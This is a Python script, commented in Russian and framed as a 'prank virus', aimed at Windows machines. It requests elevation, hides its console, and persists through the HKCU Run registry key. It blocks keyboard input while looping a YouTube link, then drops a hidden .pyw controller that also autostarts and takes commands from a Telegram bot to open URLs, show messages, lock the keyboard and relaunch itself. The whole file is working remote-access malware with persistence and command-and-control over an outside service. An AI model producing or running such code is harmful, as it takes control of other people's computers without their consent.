import webbrowser
import time
import sys
import os
import ctypes
import keyboard
import requests
import json
from urllib.parse import urlparse
from datetime import datetime

# ========== НАСТРОЙКИ ==========
URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
TIME_OFFSET = 30
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
CHAT_ID = "ВАШ_CHAT_ID"
# ===============================

# ---------- Проверка прав администратора (Windows) ----------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if os.name == 'nt' and not is_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 0)
    sys.exit()

# ---------- Скрываем окно консоли ----------
if os.name == 'nt':
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

# ---------- Автозагрузка (Windows) ----------
def add_to_startup(script_path, name):
    """Добавляет скрипт в автозагрузку через реестр HKCU\Run."""
    try:
        import winreg
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, name, 0, winreg.REG_SZ, script_path)
        return True
    except:
        return False

def remove_from_startup(name):
    """Удаляет запись из автозагрузки."""
    try:
        import winreg
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, name)
        return True
    except:
        return False

# Добавляем основной скрипт в автозагрузку (если ещё нет)
if os.name == 'nt':
    add_to_startup(sys.executable + " " + os.path.abspath(sys.argv[0]), "PrankVirus")

# -----------------------------------------------------------------

stop_program = False
remote_events_active = False

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def add_time_to_url(url, seconds):
    if seconds <= 0:
        return url
    parsed = urlparse(url)
    if 'youtube.com' in parsed.netloc or 'youtu.be' in parsed.netloc:
        sep = '&' if parsed.query else '?'
        return url + f"{sep}t={seconds}s"
    return url

def open_website():
    webbrowser.open_new_tab(add_time_to_url(URL, TIME_OFFSET))

def create_remote_controller():
    """Создаёт скрытый скрипт удалённого управления (.pyw) и добавляет в автозагрузку."""
    global remote_events_active
    remote_events_active = True

    script_content = f'''import os
import sys
import time
import requests
import json
import webbrowser
import subprocess
import ctypes
from datetime import datetime

# ===== НАСТРОЙКИ (синхронизированы с основным скриптом) =====
BOT_TOKEN = "{BOT_TOKEN}"
CHAT_ID = "{CHAT_ID}"
# ============================================================

# ---------- Скрываем окно консоли ----------
if os.name == 'nt':
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

# ---------- Автозагрузка ----------
def add_to_startup(script_path, name):
    try:
        import winreg
        key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, name, 0, winreg.REG_SZ, script_path)
        return True
    except:
        return False

# Добавляем себя в автозагрузку (если ещё нет)
if os.name == 'nt':
    # Используем pythonw.exe для скрытого запуска
    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
    add_to_startup(pythonw + " " + os.path.abspath(__file__), "RemoteEvents")

# ------------------------------------------

def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage"
        requests.post(url, json={{"chat_id": CHAT_ID, "text": text}}, timeout=3)
    except:
        pass

def open_url(url):
    webbrowser.open_new_tab(url)
    send_message(f"🌐 Открыт сайт: {{url}}")

def show_message(text):
    try:
        if os.name == 'nt':
            ctypes.windll.user32.MessageBoxW(0, text, "Удалённое управление", 0)
        else:
            os.system(f'notify-send "Удалённое управление" "{{text}}"')
    except:
        pass
    send_message(f"💬 Показано сообщение: {{text}}")

def lock_keyboard():
    import keyboard
    def block(e):
        return False
    keyboard.hook(block)
    send_message("🔒 Клавиатура заблокирована")

def unlock_keyboard():
    import keyboard
    keyboard.unhook_all()
    send_message("🔓 Клавиатура разблокирована")

def restart_prank():
    send_message("🔄 Перезапуск пранка...")
    try:
        prank_path = os.path.join(os.path.dirname(__file__), "prank.py")
        if os.name == 'nt':
            os.startfile(prank_path)
        else:
            os.system(f"python3 {{prank_path}} &")
    except:
        pass

def kill_all():
    send_message("☠️ Завершение всех процессов...")
    # Удаляем из автозагрузки
    try:
        import winreg
        key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, "PrankVirus")
            winreg.DeleteValue(regkey, "RemoteEvents")
    except:
        pass
    os._exit(0)

def get_last_command():
    try:
        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/getUpdates"
        response = requests.get(url, timeout=5)
        data = response.json()
        if data["ok"] and data["result"]:
            last_msg = data["result"][-1]
            if str(last_msg["message"]["chat"]["id"]) == CHAT_ID:
                return last_msg["message"]["text"]
    except:
        pass
    return None

send_message("✅ Удалённый контроллер активирован!")
send_message("📋 Команды: /open URL, /msg ТЕКСТ, /lock, /unlock, /restart, /kill")

while True:
    try:
        cmd = get_last_command()
        if cmd:
            if cmd.startswith("/open "):
                url = cmd[6:]
                open_url(url)
            elif cmd.startswith("/msg "):
                text = cmd[5:]
                show_message(text)
            elif cmd == "/lock":
                lock_keyboard()
            elif cmd == "/unlock":
                unlock_keyboard()
            elif cmd == "/restart":
                restart_prank()
            elif cmd == "/kill":
                kill_all()
            elif cmd == "/help":
                send_message("📋 Команды: /open URL, /msg ТЕКСТ, /lock, /unlock, /restart, /kill")
    except:
        pass
    time.sleep(3)
'''

    # Сохраняем как .pyw (скрытый запуск)
    with open("remote_events.pyw", "w", encoding="utf-8") as f:
        f.write(script_content)

    send_telegram_message("📄 Создан файл удалённого управления (скрытый)!")

    # Добавляем в автозагрузку
    if os.name == 'nt':
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        script_path = os.path.abspath("remote_events.pyw")
        add_to_startup(pythonw + " " + script_path, "RemoteEvents")
        # Запускаем скрыто через pythonw
        os.system(f'"{pythonw}" "{script_path}" &')
    else:
        # Для Linux/macOS – просто запускаем в фоне
        os.system("python3 remote_events.pyw &")

    send_telegram_message("🚀 Удалённый контроллер запущен в фоне!")

def on_key_event(e):
    global stop_program
    if e.name == 'esc':
        stop_program = True
        send_telegram_message("🛑 Пранк остановлен! Создаю удалённый контроллер...")
        create_remote_controller()
        return False
    return False

# Уведомление о старте
send_telegram_message("🎭 Пранк активирован! Клавиатура заблокирована.")

keyboard.hook(on_key_event)

while not stop_program:
    open_website()
    for _ in range(10):
        if stop_program:
            break
        time.sleep(1)

if remote_events_active:
    time.sleep(2)

keyboard.unhook_all()
os._exit(0)